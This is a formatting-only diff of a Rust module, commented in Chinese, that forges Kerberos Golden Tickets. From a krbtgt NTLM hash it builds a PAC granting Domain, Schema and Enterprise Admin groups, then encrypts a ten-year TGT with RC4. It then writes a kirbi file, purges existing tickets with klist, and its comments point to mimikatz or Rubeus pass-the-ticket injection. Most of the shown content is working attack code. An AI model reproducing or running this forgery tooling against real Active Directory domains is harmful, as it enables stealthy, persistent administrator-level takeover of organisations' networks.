@@ -49,11 +49,11 @@ impl Default for GoldenTicketConfig {
             username: "Administrator".to_string(),
             user_rid: 500,
             group_rids: vec![
-                512,  // Domain Admins
-                513,  // Domain Users
-                518,  // Schema Admins
-                519,  // Enterprise Admins
-                520,  // Group Policy Creator Owners
+                512, // Domain Admins
+                513, // Domain Users
+                518, // Schema Admins
+                519, // Enterprise Admins
+                520, // Group Policy Creator Owners
             ],
             lifetime_days: 3650,
             etype: 23, // RC4-HMAC
@@ -108,8 +108,8 @@ pub fn create_golden_ticket(config: &GoldenTicketConfig) -> Result<GoldenTicket,
     }
 
     // 解码NTLM哈希
-    let krbtgt_key = hex::decode(&config.krbtgt_nthash)
-        .map_err(|e| format!("NTLM哈希解码失败: {}", e))?;
+    let krbtgt_key =
+        hex::decode(&config.krbtgt_nthash).map_err(|e| format!("NTLM哈希解码失败: {}", e))?;
 
     if krbtgt_key.len() != 16 {
         return Err("NTLM哈希长度无效（应为16字节）".to_string());
@@ -117,7 +117,9 @@ pub fn create_golden_ticket(config: &GoldenTicketConfig) -> Result<GoldenTicket,
 
     tracing::info!(
         "[Golden Ticket] 伪造TGT: {}@{} (SID: {})",
-        config.username, config.domain, config.domain_sid
+        config.username,
+        config.domain,
+        config.domain_sid
     );
 
     // 构造PAC (Privilege Attribute Certificate)
@@ -160,12 +162,7 @@ pub fn create_golden_ticket(config: &GoldenTicketConfig) -> Result<GoldenTicket,
 }
 
 /// 构造PAC (Privilege Attribute Certificate)
-fn build_pac(
-    username: &str,
-    user_rid: u32,
-    group_rids: &[u32],
-    domain_sid: &str,
-) -> Vec<u8> {
+fn build_pac(username: &str, user_rid: u32, group_rids: &[u32], domain_sid: &str) -> Vec<u8> {
     // PAC结构 (简化):
     // - PAC_INFO_BUFFER (头部)
     // - PAC_LOGON_INFO:
@@ -227,7 +224,8 @@ fn build_pac_logon_info(
     info.extend_from_slice(&0u32.to_le_bytes());
 
     // Username (UTF-16LE, 以长度前缀)
-    let username_utf16: Vec<u8> = username.encode_utf16()
+    let username_utf16: Vec<u8> = username
+        .encode_utf16()
         .flat_map(|c| c.to_le_bytes())
         .collect();
     info.extend_from_slice(&(username_utf16.len() as u16).to_le_bytes());
@@ -304,17 +302,15 @@ fn build_tgt(
     tgt.extend_from_slice(&sname);
 
     // ---- 加密部分 (EncTicketPart) ----
-    let enc_part = build_enc_ticket_part(
-        username, user_rid, domain_sid,
-        pac, valid_from, valid_until,
-    );
+    let enc_part =
+        build_enc_ticket_part(username, user_rid, domain_sid, pac, valid_from, valid_until);
 
     // 使用krbtgt密钥加密
     let encrypted = encrypt_ticket_part(&enc_part, krbtgt_key, etype)?;
 
     // enc-part [3]
     tgt.push(0xA3); // [3]
-    // 添加加密数据
+                    // 添加加密数据
     let enc_len = encrypted.len();
     if enc_len < 128 {
         tgt.push(enc_len as u8);
@@ -383,11 +379,7 @@ fn build_enc_ticket_part(
 }
 
 /// 加密票据部分
-fn encrypt_ticket_part(
-    data: &[u8],
-    key: &[u8],
-    etype: i32,
-) -> Result<Vec<u8>, String> {
+fn encrypt_ticket_part(data: &[u8], key: &[u8], etype: i32) -> Result<Vec<u8>, String> {
     match etype {
         23 => {
             // RC4-HMAC: 直接的RC4加密
@@ -450,7 +442,9 @@ fn encode_sid(sid_str: &str) -> Result<Vec<u8>, String> {
     sid.push(subauth_count);
 
     // IdentifierAuthority (6字节，大端序)
-    let id_auth: u64 = parts[2].parse().map_err(|_| "无效的ID Authority".to_string())?;
+    let id_auth: u64 = parts[2]
+        .parse()
+        .map_err(|_| "无效的ID Authority".to_string())?;
     // 需要6字节表示
     sid.push(((id_auth >> 40) & 0xFF) as u8);
     sid.push(((id_auth >> 32) & 0xFF) as u8);
@@ -486,9 +480,7 @@ pub fn inject_golden_ticket(ticket: &GoldenTicket) -> Result<String, String> {
         .map_err(|e| format!("写入kirbi文件失败: {}", e))?;
 
     // 使用klist purge清除现有票据
-    let _ = std::process::Command::new("klist")
-        .args(["purge"])
-        .output();
+    let _ = std::process::Command::new("klist").args(["purge"]).output();
 
     // 使用mimikatz kerberos::ptt注入票据
     // 或使用Rubeus ptt
@@ -509,7 +501,7 @@ pub fn inject_golden_ticket(ticket: &GoldenTicket) -> Result<String, String> {
         ticket.domain,
         ticket.username,
         ticket.domain_sid,
-        ticket.valid_until - ticket.valid_from,  // 有效期秒数转天数示意
+        ticket.valid_until - ticket.valid_from, // 有效期秒数转天数示意
         kirbi_path.display(),
         &ticket.ticket_base64[..std::cmp::min(80, ticket.ticket_base64.len())],
         kirbi_path.display(),
@@ -575,7 +567,7 @@ mod tests {
         assert!(result.is_ok());
         let bytes = result.unwrap();
         assert_eq!(bytes[0], 1); // revision
-        // SubAuthorityCount = 1(5) + 4(RIDs) = 5
+                                 // SubAuthorityCount = 1(5) + 4(RIDs) = 5
         assert_eq!(bytes[1], 5);
     }
 
